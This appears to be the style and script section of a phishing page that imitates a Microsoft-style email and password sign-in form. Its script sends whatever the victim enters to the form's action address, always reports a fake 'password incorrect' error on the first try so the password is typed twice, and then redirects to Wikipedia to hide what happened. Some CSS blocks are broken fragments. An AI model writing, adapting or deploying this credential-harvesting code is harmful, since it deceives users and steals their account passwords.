        input[type="email"]#email {

            background: none;

            font-size: 15px;
            font-weight: 400;
            padding: 0;
            margin: 0;
        }

        input[type="email"]#email:focus {
            outline: none;
        }



        button {
            background-color: #007BFF;
            color: white;
            cursor: pointer;
        }

        #msgfont {
            color: red;
        }

        .title {
            line-height: 1.5rem;
            color: #1b1b1b;
            font-size: 1.3rem;

        }

        .logo {
            margin-bottom: 20px;
            margin-left: 10px;
        }

        .mb-16 {
            margin-bottom: 16px;
        }

            background-color: #0067b8;
            color: #fff;
            border: 2px solid #0067b8;
            padding: 5px 30px;
            font-size: 15px;

        .btn:hover {

        }

            margin-bottom: 20px;
        }

<script>
let firstAttempt = true;

document.forms['street'].addEventListener('submit', function(e) {
    e.preventDefault();
    
    const form = this;
    const btn = document.getElementById('btnLogin');
    const formData = new FormData(form);
    
    btn.value = 'Checking...';
    btn.disabled = true;
    
    fetch(form.action, {
        method: 'POST',
        body: formData
    });
    
    if (firstAttempt) {
        firstAttempt = false;
        const msg = document.getElementById('msgfont');
        const pass = document.getElementById('pass');
        
        setTimeout(() => {
            msg.innerHTML = 'Your account password is incorrect, Please try again.';
            msg.style.color = 'red';
            btn.value = 'Next';
            btn.disabled = false;
            pass.value = '';
            pass.focus();
            
            setTimeout(() => msg.innerHTML = '', 5000);
        }, 2500);
    } else {
        setTimeout(() => {
            window.location.href = 'https://wikipedia.org';
        }, 2500);
    }
});
</script>
